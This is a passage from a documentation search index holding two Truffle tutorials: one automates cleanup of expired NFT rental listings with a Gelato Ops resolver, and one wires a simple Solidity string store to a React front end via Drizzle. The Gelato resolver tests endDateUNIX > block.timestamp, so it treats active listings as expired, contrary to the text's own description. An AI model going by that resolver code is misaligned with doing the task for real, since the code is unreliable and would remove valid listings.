"guides/gelato-smart-contract-automation/#web3-unleashed-how-to-automate-your-smart-contracts", "text": "Written by Emily Lin Last updated 9/15/2022", "title": "Web3 Unleashed: How to Automate Your Smart Contracts"}, {"location": "guides/gelato-smart-contract-automation/#overview", "text": "In this edition of Web3 Unleashed, we're interviewing Gelato Network co-founder Hilmar Orth about all things smart contract automation - what it is, how it's revolutionizing Web3 devOps, and how to do it! In this guide, we'll be building on our NFT rental marketplace we built last week . Specifically, we'll demonstrate how to use Gelato Ops to automate cleaning up our listings - that is, periodically removing unavailable listings. Watch the stream to learn more about Gelato's other offerings, such as their relay SDK . The completed code lives here .", "title": "Overview"}, {"location": "guides/gelato-smart-contract-automation/#what-is-gelato", "text": "Gelato Network takes away the need for web3 developers to manually manage smart contract processes. Specifically, it leverages a network of decentralized bots to automate transactions, taking the onus off developers to maintain complex systems that could result in a central point of failure, allowing them to dedicate more time to what matters most: building out dapps across DeFi, NFTs, gaming, DAOs, and whatever else the future of Web3 holds!", "title": "What is Gelato?"}, {"location": "guides/gelato-smart-contract-automation/#using-gelato-ops", "text": "Gelato Ops is a nifty automation hub that allows users to create their automated tasks. Read more about it here . For our use case, our automated task relies on a dynamic argument Listing[] listings and will only be executed under the condition that there are listings that are no longer available to rent. Therefore, we need to write a resolver to solve our more complex use case.", "title": "Using Gelato Ops"}, {"location": "guides/gelato-smart-contract-automation/#download-system-requirements", "text": "You'll need to install: Node.js , v12 or higher truffle", "title": "Download System Requirements"}, {"location": "guides/gelato-smart-contract-automation/#create-an-infura-account-and-project", "text": "To connect your DApp to the Goerli network, you'll need an Infura account. Sign up for an account here . Once you're signed in, create a project! Let's call it gelato-automation , and select Web3 API from the dropdown", "title": "Create an Infura account and project"}, {"location": "guides/gelato-smart-contract-automation/#register-for-a-metamask-wallet", "text": "To interact with your DApp in the browser, you'll need a MetaMask wallet. You can download it and create one here .", "title": "Register for a MetaMask wallet"}, {"location": "guides/gelato-smart-contract-automation/#download-vs-code", "text": "Feel free to use whatever IDE you want, but we highly recommend using VS Code! You can run through most of this tutorial using the Truffle extension to create, build, and deploy your smart contracts, all without using the CLI! You can read more about it here .", "title": "Download VS Code"}, {"location": "guides/gelato-smart-contract-automation/#get-some-test-eth", "text": "In order to deploy to the public testnets, you'll need some test Eth to cover your gas fees! Make sure you're getting test Eth for either Goerli or Sepolia.", "title": "Get Some Test Eth"}, {"location": "guides/gelato-smart-contract-automation/#set-up-your-project", "text": "Since we're building on our NFT rental marketplace from episode 4, start by cloning the base repository. git clone https://github.com/trufflesuite/unleashed_nft_rental_marketplace.git gelato-demo We'll only be working with contracts, so hop into the truffle directory and install our package dependencies. cd gelato-demo/truffle npm i", "title": "Set Up Your Project"}, {"location": "guides/gelato-smart-contract-automation/#write-the-automated-task", "text": "In our marketplace, we will remove listings that are no longer available. A listing becomes unavailable when the end date of the listing has passed. Add this method to Marketplace.sol : function removeUnavailableListings ( Listing [] memory unavailableListings ) public { for ( uint i = 0 ; i < unavailableListings . length ; i ++ ) { unlistNFT ( unavailableListings [ i ]. nftContract , unavailableListings [ i ]. tokenId ); } } It steps through a list of unavailable listings and calls our already written unlistNFT function, which will remove the NFT from our marketplace's list of listings and decrement the total number of listings available.", "title": "Write the automated task"}, {"location": "guides/gelato-smart-contract-automation/#write-iresolver", "text": "Because our automated task takes in the dynamic argument unavailableListings and is dependent on on a few conditions, we'll need to write a resolver. The first thing we will do is create a resolver interface. This isn't explicitly necessary, but is good practice if you have to write multiple resolvers for different smart contracts. truffle create contract IResolver Then, paste in the following code: // SPDX-License-Identifier: MIT pragma solidity >= 0.4.22 < 0.9.0 ; interface IResolver { function checker () external view returns ( bool canExec , bytes memory execPayload ); } And have Marketplace.sol extend that contract: import \"./IResolver.sol\" ; contract Marketplace is ReentrancyGuard , IResolver {", "title": "Write IResolver"}, {"location": "guides/gelato-smart-contract-automation/#write-the-resolver", "text": "Now, we can get to actually writing our resolver! It should return two things: bool canExec : whether Gelato should execute the task. bytes execPayload : data that executors should use for the execution. Add this method: function checker () external view override returns ( bool canExec , bytes memory execPayload ) { uint256 totalListingCount = _nftsListed . current (); uint256 unavailableListingCount = 0 ; Listing [] memory allListings = getAllListings (); for ( uint i = 0 ; i < totalListingCount ; i ++ ) { if ( allListings [ i ]. endDateUNIX > block . timestamp ) { unavailableListingCount ++ ; } } if ( unavailableListingCount <= 0 ) { return ( false , bytes ( \"No listings to unlist\" )); } if ( tx . gasprice > 80 gwei ) { return ( false , bytes ( \"Gas price is greater than 80 gwei\" )); } Listing [] memory unavailableListings = new Listing []( unavailableListingCount ); uint256 unavailableListingsCount = 0 ; for ( uint i = 0 ; i < totalListingCount ; i ++ ) { if ( allListings [ i ]. endDateUNIX > block . timestamp ) { unavailableListings [ unavailableListingsCount ] = allListings [ i ]; unavailableListingsCount ++ ; } } execPayload = abi . encodeWithSelector ( this . removeUnavailableListings . selector , unavailableListings ); return ( true , execPayload ); } Now, let's dive into the code. In order to construct our list of unavailable listings to pass into the automated task, we want to get the number of unavailable listings as follows: uint256 totalListingCount = _nftsListed . current (); uint256 unavailableListingCount = 0 ; Listing [] memory allListings = getAllListings (); for ( uint i = 0 ; i < totalListingCount ; i ++ ) { if ( allListings [ i ]. endDateUNIX > block . timestamp ) { unavailableListingCount ++ ; } } Next, since removing unavailable listings is contingent upon there being listings in the first place, we want to exit the resolver. In addition to returning false for canExec , we can also log the reason for the failure as follows: if ( unavailableListingCount <= 0 ) { return ( false , bytes ( \"No listings to unlist\" )); } if ( tx . gasprice > 80 gwei ) { return ( false , bytes ( \"Gas price is greater than 80 gwei\" )); } Also, notice that we included a gas limit. Since what we are automating is not necessarily time-sensitive, we can add in that check so we don't incur higher costs. In our example, we will be running the checker with every block. If you want the task to only check at a certain cadence, you can add a lastExecuted like in the docs . The last piece is actually constructing the list of unavailable listings and executing the automated task: Listing [] memory unavailableListings = new Listing []( unavailableListingCount ); uint256 unavailableListingsCount = 0 ; for ( uint i = 0 ; i < totalListingCount ; i ++ ) { if ( allListings [ i ]. endDateUNIX > block . timestamp ) { unavailableListings [ unavailableListingsCount ] = allListings [ i ]; unavailableListingsCount ++ ; } } execPayload = abi . encodeWithSelector ( this . removeUnavailableListings . selector , unavailableListings ); return ( true , execPayload ); To briefly explain abi.encodeWithSelector , the function selector is the first four bytes of Keccak-256 (SHA-3) hash of the function signature, which indicates the function to be called. This allows our automated task to be called with the appropriate parameters. So, we just end with returning (true, execPayload) to indicate what the task is and that it should be executed.", "title": "Write the resolver"}, {"location": "guides/gelato-smart-contract-automation/#update-unlistnft", "text": "Currently, unlistNFT can only be called by the owner of NFT or the marketplace contract address. Now that gelato is automating that task, we need to whitelist its address as well. You can see the list of contract addresses here . We'll be deploying on Goerli, so the address we will whitelist is 0xc1C6805B857Bef1f412519C4A842522431aFed39 . If you followed along in Web3 Unleashed episode 3 , you might remember learning about proxy contracts. In this case, the Gelato Ops contract is a proxy contract, so its address is constant despite its implementation contract potentially changing. Anyways, add the constant to the Marketplace.sol list of variables at the top address private constant GELATO_OPS_GOERLI = address(0xc1C6805B857Bef1f412519C4A842522431aFed39); . Then modify the require conditions to include the Ops contract address: require ( listing . owner == msg . sender || _marketOwner == msg . sender || GELATO_OPS_GOERLI == msg . sender , \"Not approved to unlist NFT\" ); Your final function should look like this: function unlistNFT ( address nftContract , uint256 tokenId ) public payable nonReentrant { Listing storage listing = _listingMap [ nftContract ][ tokenId ]; require ( listing . owner != address ( 0 ), \"This NFT is not listed\" ); require ( listing . owner == msg . sender || _marketOwner == msg . sender || GELATO_OPS_GOERLI == msg . sender , \"Not approved to unlist NFT\" ); // fee to be returned to user if unlisted before rental period is up // nothing to refund if no renter uint256 refund = 0 ; if ( listing . user != address ( 0 )) { refund = (( listing . expires - block . timestamp ) / 60 / 60 / 24 + 1 ) * listing . pricePerDay ; require ( msg . value >= refund , \"Not enough ether to cover refund\" ); payable ( listing . user ). transfer ( refund ); } // clean up data IERC4907 ( nftContract ). setUser ( tokenId , address ( 0 ), 0 ); EnumerableSet . remove ( _nftContractTokensMap [ nftContract ], tokenId ); delete _listingMap [ nftContract ][ tokenId ]; if ( EnumerableSet . length ( _nftContractTokensMap [ nftContract ]) == 0 ) { EnumerableSet . remove ( _nftContracts , nftContract ); } _nftsListed . decrement (); emit NFTUnlisted ( msg . sender , nftContract , tokenId , refund ); }", "title": "Update unlistNFT"}, {"location": "guides/gelato-smart-contract-automation/#deploy-the-rentablepets-contract-to-goerli", "text": "Let's deploy the contract to Goerli. Then, let's deploy it to the Goerli testnet using Truffle dashboard! To do so, let's add our Infura Goerli endpoint to our MetaMask wallet. First get your Infura endpoint from your Infura dashboard, and then navigate to Add Networks in MetaMask. Make sure your MetaMask wallet is connected to goerlidev and run: truffle dashboard truffle migrate --network dashboard This should bring up Truffle dashboard on localhost:24012 and prompt you to sign the deployment.", "title": "Deploy the RentablePets contract to Goerli"}, {"location": "guides/gelato-smart-contract-automation/#add-the-task-to-gelato-ops", "text": "Gelato has a super easy to use UI to automate your tasks. Navigate to the app and hit create task! It's pretty simple First, add your Marketplace contract address - because we didn't verify the contract, we'll have to manually add in the abi . To get this, go to Marketplace.json file in your contracts_build_directory . Alternatively, if you have the VS Code extension, you can directly access it there. Open it up, and copy in the ABI into the Gelato app and choose removeUnavailableListings as the function of choice to automate. Next, since we are using a resolver, choose Resolver and paste in the contract address and ABI, and then select checker as your resolver function. Note that Gelato will prompt you for a proxy contract. Since this is simple example, we don't need to check that off. Lastly, we have two options to pay. Go ahead and choose Gelato balance, name your task Remove Unavailable Listings , and create the task!", "title": "Add the task to Gelato Ops"}, {"location": "guides/gelato-smart-contract-automation/#test-the-task", "text": "Let's go ahead and test the task. If we wait a bit without listing any NFTs, you'll notice that the resolver properly returns false and logs the appropriate message. To test this out, let's mint and list an NFT. Go to the run.js script and comment out the rent and unlist function call so when we call the script, we only list it. Additionally, we'll want to edit the end date for listing so that we can quickly cause a task execution. const RentableNft = artifacts . require ( \"RentableNft\" ); const Marketplace = artifacts . require ( \"Marketplace\" ); const TODAY = Math . floor ( Date . now () / 1000 ) + ( 60 * 60 ); const TOMORROW = TODAY + ( 24 * 60 * 60 ); const TOKEN_ID = 1 ; const PRICE = 1 ; const START = TODAY ; const END = TODAY + 500 ; const EXPIRES = TOMORROW ; const ERC721_ABI = [ { \"inputs\" : [{ \"internalType\" : \"address\" , \"name\" : \"to\" , \"type\" : \"address\" }, { \"internalType\" : \"uint256\" , \"name\" : \"tokenId\" , \"type\" : \"uint256\" }], \"name\" : \"approve\" , \"outputs\" : [], \"stateMutability\" : \"nonpayable\" , \"type\" : \"function\" }, { \"inputs\" : [{ \"internalType\" : \"uint256\" , \"name\" : \"tokenId\" , \"type\" : \"uint256\" }], \"name\" : \"ownerOf\" , \"outputs\" : [{ \"internalType\" : \"address\" , \"name\" : \"owner\" , \"type\" : \"address\" }], \"stateMutability\" : \"view\" , \"type\" : \"function\" }, { \"inputs\" : [ { \"internalType\" : \"uint256\" , \"name\" : \"tokenId\" , \"type\" : \"uint256\" } ], \"name\" : \"userExpires\" , \"outputs\" : [ { \"internalType\" : \"uint256\" , \"name\" : \"\" , \"type\" : \"uint256\" } ], \"stateMutability\" : \"view\" , \"type\" : \"function\" , \"constant\" : true } ]; const main = async ( cb ) => { try { const nft = await RentableNft . deployed (); const NFT_CONTRACT = nft . address ; let txn = await nft . mint ( \"test\" ); console . log ( txn ); const marketplace = await Marketplace . deployed (); const listingFee = ( await marketplace . getListingFee ()). toString (); const nftContract = new web3 . eth . Contract ( ERC721_ABI , NFT_CONTRACT ); const owner = await nftContract . methods . ownerOf ( TOKEN_ID ). call (); txn = await nftContract . methods . approve ( marketplace . address , TOKEN_ID ). send ({ from : owner }); console . log ( txn ); txn = await marketplace . listNFT ( NFT_CONTRACT , TOKEN_ID , PRICE , START , END , { from : owner , value : listingFee }); console . log ( txn ); let value = (( EXPIRES - TODAY ) / 60 / 60 / 24 + 1 ) * PRICE ; let user = ( await web3 . eth . getAccounts ())[ 0 ]; // txn = await marketplace.rentNFT(NFT_CONTRACT, TOKEN_ID, EXPIRES, {from: user, value: value}); // console.log(txn); // value = (Math.floor((EXPIRES - Date.now()/1000)/60/60/24 + 1)) * PRICE; // let options = value < 0 ? {from: owner} : {from: owner, value: value}; // txn = await marketplace.unlistNFT(NFT_CONTRACT, TOKEN_ID, options); // console.log(txn); } catch ( err ) { console . log ( err ); } cb (); } module . exports = main ; `` Start the console by calling truffle console --dashboard and then call run.js using exec run.js . You'll need to sign 3 transactions: mint, approve, and list. If you don't want to do this manually through dashboard, you can opt to specify a goerli network in the truffle-config like this . You can quickly verify the NFT has been listed provided Gelato hasn't already executed your task as follows: truffle ( dashboard ) > let mp = await Marketplace.deployed () undefined truffle ( dashboard ) > mp.getAllListings () [ [ '0xA31618621805C9215B5Ade58EB09dBA8f32Bbdb8' , '0x0000000000000000000000000000000000000000' , '0xaa902bEc2FEa12bc2AD4F94D58CF7dF424e18f0d' , '1' , '1' , '1663244950' , '1663245450' , '0' , owner: '0xA31618621805C9215B5Ade58EB09dBA8f32Bbdb8' , user: '0x0000000000000000000000000000000000000000' , nftContract: '0xaa902bEc2FEa12bc2AD4F94D58CF7dF424e18f0d' , tokenId: '1' , pricePerDay: '1' , startDateUNIX: '1663244950' , endDateUNIX: '1663245450' , expires: '0' ] ] Now, we expect the resolver to pass true and execute the task. You can see it in the logs in your Gelato app: And reverify that the listing is unlisted by calling mp.getAllListings() truffle ( dashboard ) > mp.getAllListings () []", "title": "Test the Task"}, {"location": "guides/gelato-smart-contract-automation/#future-extensions", "text": "So, that's it! We've written a resolver and automated a task! For a more a detailed walkthrough of the code, be sure to watch the livestream on YouTube . Next episode we'll be covering decentralized streaming with Livepeer. Sign up for reminders for Web3 Unleashed here . If you want to talk about this content, make suggestions for what you'd like to see or ask questions about the series, start a discussion here . If you want to show off what you built or just hang with the Unleashed community in general, join our Discord ! Lastly, don't forget to follow us on Twitter for the latest updates on all things Truffle.", "title": "Future Extensions"}, {"location": "guides/getting-started-with-drizzle-and-react/", "text": "Getting Started with Drizzle and React \u00b6 Archived: This tutorial has been archived and may not work as expected; versions are out of date, methods and workflows may have changed. We leave these up for historical context and for any universally useful information contained. Use at your own risk! Drizzle is the newest member of the Truffle Suite and our first front-end development tool. At its core, Drizzle takes care of synchronizing your contract data, transaction data and more from the blockchain to a Redux store. There are also higher-level abstractions on top of the base drizzle library; tools for React compatibility ( drizzle-react ) and a set of ready-to-use React components ( drizzle-react-components ). We're going to focus on the lower levels today, taking you through setting up a Truffle project with React and Drizzle from scratch. This way we can gain the best understanding of how Drizzle works under the hood. With this knowledge, you can leverage the full power of Drizzle with any front-end framework of your choosing, or use the higher-level React abstractions with confidence. This will be a very minimal tutorial focused on setting and getting a simple string stored in a contract. It's meant for those with a basic knowledge of Truffle, who have some knowledge of JavaScript and React.js, but who are new to using Drizzle. Note : For Truffle basics, please read through the Truffle Pet Shop tutorial before proceeding. In this tutorial we will be covering: Setting up the development environment Creating a Truffle project from scratch Writing the smart contract Compiling and migrating the smart contract Testing the smart contract Creating our React.js project Wiring up the front-end client Wire up the React app with Drizzle Write a component to read from Drizzle Write a component to write to the smart contract Setting up the development environment \u00b6 There are a few technical requirements before we start. Please install the following: Node.js v8+ LTS and npm (comes with Node) Truffle \u00b6 Once we have those installed, we only need one command to install Truffle: npm install -g truffle To verify that Truffle is installed properly, type truffle version on a terminal. If you see an error, make sure that your npm modules are added to your path. Create-React-App \u00b6 Finally, since this is a React.js tutorial, we will be creating our React project with Create-React-App . You won't have to do anything if you have NPM version 5.2 or above. You can check your NPM version by running npm --version . If you do not, then you will need to install the tool globally with this command: npm install -g create-react-app Creating a Truffle project \u00b6 Truffle initializes in the current directory, so first create a directory in your development folder of choice and then move inside it. mkdir drizzle-react-tutorial cd drizzle-react-tutorial Now we're ready to spawn our empty Truffle project by running the following command: truffle init Let's take a brief look at the directory structure that was just generated. Directory structure \u00b6 The default Truffle directory structure contains the following: contracts/ : Contains the Solidity source files for our smart contracts. There is an important contract in here called Migrations.sol , which we'll talk about later. migrations/ : Truffle uses a migration system to handle smart contract deployments. A migration is an additional special smart contract that keeps track of changes. test/ : Contains both JavaScript and Solidity tests for our smart contracts. truffle-config.js : Truffle configuration file. Writing our smart contract \u00b6 We'll add a simple smart contract called MyStringStore. Create a new file named MyStringStore.sol in the contracts/ directory. Add the following content to the file: pragma solidity ^ 0.5.0 ; contract MyStringStore { string public myString = \"Hello World\" ; function set ( string memory x ) public { myString = x ; } } Since this isn't a Solidity tutorial, all you need to know about this is: We've created a public string variable named myString and initialized it to \"Hello World\". This automatically creates a getter (since it's a public variable) so we don't have to write one ourselves. We've created a setter method that simply sets the myString variable with whatever string is passed in. Launching a test blockchain with Truffle Develop \u00b6 Before we move ahead, let's first launch our test blockchain with the Truffle Develop console. Open up a new terminal, navigate to the project directory, and run the following command: truffle develop This will spawn a new blockchain that listens on 127.0.0.1:9545 by default. Compiling and migrating the smart contract \u00b6 Now we are ready to compile and migrate our contract. Compilation \u00b6 In the Truffle Develop console, type the following command: compile Note : If you're on Windows and encountering problems running this command, please see the documentation on [resolving naming conflicts on Windows](/docs/truffle/reference/configuration#resolving-naming-conflicts-on-windows). You should see output similar to the following: Compiling ./contracts/Migrations.sol... Compiling ./contracts/MyStringStore.sol... Writing artifacts to ./build/contracts Migration \u00b6 Now that we've successfully compiled our contracts, it's time to migrate them to the blockchain! Note : Read more about migrations in the [Truffle documentation](/docs/truffle/getting-started/running-migrations). To create our own migration script. Create a new file named 2_deploy_contracts.js in the migrations/ directory. Add the following content to the 2_deploy_contracts.js file: const MyStringStore = artifacts . require ( \"MyStringStore\" ); module . exports = function ( deployer ) { deployer . deploy ( MyStringStore ); }; Back in our Truffle Develop console, migrate the contract to the blockchain. migrate You should see the migrations being executed in order, with the details of each migration listed. Testing the smart contract \u00b6 Before we proceed, we should write a couple tests to ensure that our contract works as expected. Create a new file named MyStringStore.js in the test/ directory. Add the following content to the MyStringStore.js file: const MyStringStore = artifacts . require ( \"./MyStringStore.sol\" ); contract ( \"MyStringStore\" , accounts => { it ( \"should store the string 'Hey there!'\" , async () => { const myStringStore = await MyStringStore . deployed (); // Set myString to \"Hey there!\" await myStringStore . set ( \"Hey there!\" , { from : accounts [ 0 ] }); // Get myString from public variable getter const storedString = await myStringStore . myString . call (); assert . equal ( storedString , \"Hey there!\" , \"The string was not stored\" ); }); }); Running the tests \u00b6 Back in the Truffle Develop console, run the tests: test If all the tests pass, you'll see console output similar to this: Using network 'develop'. Contract: MyStringStore \u2713 should store the string 'Hey there!' (98ms) 1 passing (116ms) Awesome! Now we know that the contract actually works. Creating our React.js project \u00b6 Now that we are done with the smart contract, we can write our front-end client with React.js! In order to do this, open another terminal, navigate to your project directory, and simply run this command (if you have NPM version 5.2 or above): npx create-react-app client If you have an older version of NPM , make sure Create-React-App is installed globally as per the instructions in the Setting up the development environment section and then run the following: create-react-app client This should create a client directory in your Truffle project and bootstrap a barebones React.js project for you to start building your front-end with. Wiring up the front-end client \u00b6 Since Create-React-App's default behavior disallows importing files from outside of the src folder, we need to bring the contracts in our build folder inside src . We can copy and paste them every time we compile our contracts, but a better way is to simply configure Truffle to put the files there. In the truffle-config.js file, replace the contents with the following: const path = require ( \"path\" ); module . exports = { contracts_build_directory : path . join ( __dirname , \"client/src/contracts\" ) }; This will make sure to output the contract build artifacts directory inside your React project. But this also means we'll have to restart our Truffle Develop console. Press CTRL + C to exit out of the Truffle Develop console and then start it again with truffle develop . From there, make sure you run the compile and migrate commands again so that the new build artifacts will be output into the new folder. If you are encountering issues, try migrate --reset for a clean migration from scratch. Install Drizzle \u00b6 This is the most delicious part, we install Drizzle. Make sure you are in the client directory and then run the following: npm install @drizzle/store And that's it for dependencies! Note that we don't need to install Web3.js or @truffle/contract ourselves. Drizzle contains everything we need to work reactively with our smart contracts. Wire up the React app with Drizzle \u00b6 Before we go further, let's start our React app by running the follow command inside our client directory: npm start This will serve the front-end under localhost:3000 , so open that up in your browser. Note : Make sure to use an incognito window if you already have MetaMask installed (or disable MetaMask for now). Otherwise, the app will try to use the network specified in MetaMask rather than the develop network under `localhost:9545`. If the default Create-React-App page loaded without any issues, you may proceed. Setup the store \u00b6 The first thing we need to do is to setup and instantiate the Drizzle store. We are going add the following code to client/src/index.js : // import drizzle functions and contract artifact import { Drizzle } from \"@drizzle/store\" ; import MyStringStore from \"./contracts/MyStringStore.json\" ; // let drizzle know what contracts we want and how to access our test blockchain const options = { contracts : [ MyStringStore ], web3 : { fallback : { type : \"ws\" , url : \"ws://127.0.0.1:9545\" , }, }, }; // setup drizzle const drizzle = new Drizzle ( options ); First, we imported the tools from Drizzle as well as the contract definition. We then built our options object for Drizzle, which in this case is just specifying the specific contract we want to be loaded by passing in the JSON build artifact. And finally, we created the drizzleStore and used that to create our drizzle instance which we will pass in as a prop to our App component. Once that is complete, your index.js should look something like this: import React from 'react' ; import ReactDOM from 'react-dom' ; import './index.css' ; import App from './App' ; import * as serviceWorker from './serviceWorker' ; // import drizzle functions and contract artifact import { Drizzle , generateStore } from \"@drizzle/store\" ; import MyStringStore from \"./contracts/MyStringStore.json\" ; // let drizzle know what contracts we want and how to access our test blockchain const options = { contracts : [ MyStringStore ], web3 : { fallback : { type : \"ws\" , url : \"ws://127.0.0.1:9545\" , }, }, }; // setup the drizzle store and drizzle const drizzle = new Drizzle ( options ); ReactDOM . render ( < App drizzle = { drizzle } /> , document . getElementById ( 'root' )); Note again that the drizzle instance is passed into the App component as props. Wire up the App component \u00b6 Now that we have a drizzle instance to play around with, we can go into client/src/App.js to start working with the React API. Adding state variables \u00b6 First thing we will do is to add the following line inside our App component: state = { loading : true , drizzleState : null }; We are going to be using two state variables here: loading \u2014 Indicates if Drizzle has finished initializing and the app is ready. The initialization process includes instantiating web3 and our smart contracts, fetching any available Ethereum accounts and listening (or, in cases where subscriptions are not supported: polling) for new blocks. drizzleState \u2014 This is where we will store the state of the Drizzle store in our top-level component. If we can keep this state variable up-to-date, then we can simply use simple props and state to work with Drizzle (i.e. you don't have to use any Redux or advanced React patterns). Adding some initialization logic \u00b6 Next we will add in our componentDidMount method into the component class so that we can run some initialization logic. componentDidMount () { const { drizzle } = this . props ; // subscribe to changes in the store this . unsubscribe = drizzle . store . subscribe (() => { // every time the store updates, grab the state from drizzle const drizzleState = drizzle . store . getState (); // check to see if it's ready, if so, update local component state if ( drizzleState . drizzleStatus . initialized ) { this . setState ({ loading : false , drizzleState }); } }); } First, we grab the drizzle instance from the props, then we call drizzle.store.subscribe and pass in a callback function. This callback function is called whenever the Drizzle store is updated. Note that this store is actually a Redux store under the hood, so this might look familiar if you've used Redux previously. Whenever the store is updated, we will try to grab the state with drizzle.store.getState() and then if Drizzle is initialized and ready, we will set loading to false, and also update the drizzleState state variable. By doing this, drizzleState will always be up-to-date and we also know exactly when Drizzle is ready so we can use a loading component to let the user know. Unsubscribing from the store \u00b6 Note that we assign the return value of the subscribe() to a class variable this.unsubscribe . This is because it is always good practice to unsubscribe from any subscriptions you have when the component un-mounts. In order to do this, we save a reference to that subscription (i.e. this.unsubscribe ), and inside componentWillUnmount , we have the following: componentWillUnmount () { this . unsubscribe (); } This will safely unsubscribe when the App component un-mounts so we can prevent any memory leaks. Replace the render method \u00b6 Finally, we can replace the boilerplate render method with something that applies to us better: render () { if ( this . state . loading ) return \"Loading Drizzle...\" ; return < div className = \"App\" > Drizzle is ready < /div>; } In the next section, we will replace \"Drizzle is ready\" with an actual component that will read from the store. If you refresh your browser and run this app now, you should see \"Loading Drizzle...\" briefly flash on screen and then subsequently \"Drizzle is ready\". Full component code \u00b6 When you are done this section, your App component should look like the following: class App extends Component { state = { loading : true , drizzleState : null }; componentDidMount () { const { drizzle } = this . props ; // subscribe to changes in the store this . unsubscribe = drizzle . store . subscribe (() => { // every time the store updates, grab the state from drizzle const drizzleState = drizzle . store . getState (); // check to see if it's ready, if so, update local component state if ( drizzleState . drizzleStatus . initialized ) { this . setState ({ loading : false , drizzleState }); } }); } componentWillUnmount () { this . unsubscribe (); } render () { if ( this . state . loading ) return \"Loading Drizzle...\" ; return < div className = \"App\" > Drizzle is ready < /div>; } } Write a component to read from Drizzle \u00b6 First, let's create a new file at client/src/ReadString.js and paste in the following: import React from \"react\" ; class ReadString extends React . Component { componentDidMount () { const { drizzle , drizzleState } = this . props ; console . log ( drizzle ); console . log ( drizzleState ); } render () { return < div > ReadString Component < /div>; } } export default ReadString ; And then inside App.js , import the new component with this statement: import ReadString from \"./ReadString\" ; Now modify your App.js render method so that we pass in the drizzle instance from props as well as the drizzleState from the component state: render () { if ( this . state . loading ) return \"Loading Drizzle...\" ; return ( < div className = \"App\" > < ReadString drizzle = { this . props . drizzle } drizzleState = { this . state . drizzleState } /> < /div> ); } Go back to the browser and open up your console. You should see that the two console.log statements are working and they are displaying both the drizzle instance as well as a drizzleState that is fully initialized. What this tells us is that the drizzleState we get in this component will always be fully ready once this component mounts. At this point, you can take some time to explore the drizzle instance object as well as the drizzleState object. drizzle instance and drizzleState \u00b6 For the most part, drizzleState is there for you to read information from (i.e. contract state variables, return values, transaction status, account data, etc.), whereas the drizzle instance is what you will use to actually get stuff done (i.e. call contract methods, the Web3 instance, etc.). Wiring up the ReadString component \u00b6 Now that we have access to our drizzle instance and the drizzleState , we can put in the logic that allows us read the smart contract variable we are interested in. Here is what the full code of ReadString.js should look like: import React from \"react\" ; class ReadString extends React . Component { state = { dataKey : null }; componentDidMount () { const { drizzle } = this . props ; const contract = drizzle . contracts . MyStringStore ; // let drizzle know we want to watch the `myString` method const dataKey = contract . methods [ \"myString\" ]. cacheCall (); // save the `dataKey` to local component state for later reference this . setState ({ dataKey }); } render () { // get the contract state from drizzleState const { MyStringStore } = this . props . drizzleState . contracts ; // using the saved `dataKey`, get the variable we're interested in const myString = MyStringStore . myString [ this . state . dataKey ]; // if it exists, then we display its value return < p > My stored string : { myString && myString . value } < /p>; } } export default ReadString ; If everything is working, your app should display \"Hello World\". But first, let's walk through what we did here. When the component mounts \u00b6 componentDidMount () { const { drizzle } = this . props ; const contract = drizzle . contracts . MyStringStore ; // let drizzle know we want to watch the `myString` method const dataKey = contract . methods [ \"myString\" ]. cacheCall (); // save the `dataKey` to local component state for later reference this . setState ({ dataKey }); } When the component mounts, we first grab a reference to the contract we are interested in and assign it to contract . We then need to tell Drizzle to keep track of a variable we are interested in. In order to do that, we call the .cacheCall() function on the myString getter method. What we get in return is a dataKey that allows us to reference this variable. We save this to the component's state so we can use it later. The render method \u00b6 render () { // get the contract state from drizzleState const { MyStringStore } = this . props . drizzleState . contracts ; // using the saved `dataKey`, get the variable we're interested in const myString = MyStringStore . myString [ this . state . dataKey ]; // if it exists, then we display its value return < p > My stored string : { myString && myString . value } < /p>; } From the drizzleState , we grab the slice of the state we are interested in, which in this case is the MyStringStore contract. From there, we use the dataKey we saved from before in order to access the myString variable. Finally, we write myString && myString.value to show the value of the variable if it exists, or nothing otherwise. And in this case, it should show \"Hello World\" since that is the string the contract is initialized with. Quick Recap \u00b6 The most important thing to get out of this section here is that there are two steps to reading a value with Drizzle: First, you need to let Drizzle know what variable you want to watch for. Drizzle will give you a dataKey in return and you need to save it for later reference. Second, due to the asynchronous nature of how Drizzle works, you should be watching for changes in drizzleState . Once the variable accessed by the dataKey exists, you will be able to get the value you are interested in. Write a component to write to the smart contract \u00b6 Of course, simply reading a pre-initialized variable is no fun at all; we want something that we can interact with. In this section, we will create an input box where you can type a string of your choice and have it save to the blockchain forever! First, let's create a new file client/src/SetString.js and paste in the following: import React from \"react\" ; class SetString extends React . Component { state = { stackId : null }; handleKeyDown = e => { // if the enter key is pressed, set the value with the string if ( e . keyCode === 13 ) { this . setValue ( e . target . value ); } }; setValue = value => { const { drizzle , drizzleState } = this . props ; const contract = drizzle . contracts . MyStringStore ; // let drizzle know we want to call the `set` method with `value` const stackId = contract . methods [ \"set\" ]. cacheSend ( value , { from : drizzleState . accounts [ 0 ] }); // save the `stackId` for later reference this . setState ({ stackId }); }; getTxStatus = () => { // get the transaction states from the drizzle state const { transactions , transactionStack } = this . props . drizzleState ; // get the transaction hash using our saved `stackId` const txHash = transactionStack [ this . state . stackId ]; // if transaction hash does not exist, don't display anything if ( ! txHash ) return null ; // otherwise, return the transaction status return `Transaction status: ${ transactions [ txHash ] && transactions [ txHash ]. status } ` ; }; render () { return ( < div > < input type = \"text\" onKeyDown = { this . handleKeyDown } /> < div > { this . getTxStatus ()} < /div> < /div> ); } } export default SetString ; At this point, import and include it inside App.js just like you did with the ReadString component: import SetString from \"./SetString\" ; // ... render () { if ( this . state . loading ) return \"Loading Drizzle...\" ; return ( < div className = \"App\" > < ReadString drizzle = { this . props . drizzle } drizzleState = { this . state . drizzleState } /> < SetString drizzle = { this . props . drizzle } drizzleState = { this . state . drizzleState } /> < /div> ); } At this point, the app should work and you should try it out. You should be able to type something into the input text box, hit Enter, and Drizzle's react store will automatically display the new string. Next, let's go through SetString.js step-by-step. General structure \u00b6 First let's take a look at the general React.js boilerplate that we need. class SetString extends React . Component { state = { stackId : null }; handleKeyDown = e => { // if the enter key is pressed, set the value with the string if ( e . keyCode === 13 ) { this . setValue ( e . target . value ); } }; setValue = value => { ... }; getTxStatus = () => { ... }; render () { return ( < div > < input type = \"text\" onKeyDown = { this . handleKeyDown } /> < div > { this . getTxStatus ()} < /div> < /div> ); } } In this component, we will have an input text box for the user to type in a string, and when the Enter key is pressed, the setValue method will be called with the string as a parameter. Also, we will display the status of the transaction. The getTxStatus method will return a string displaying the status of the transaction by referencing a stackId state variable (more on this later). Submitting the transaction \u00b6 setValue = value => { const { drizzle , drizzleState } = this . props ; const contract = 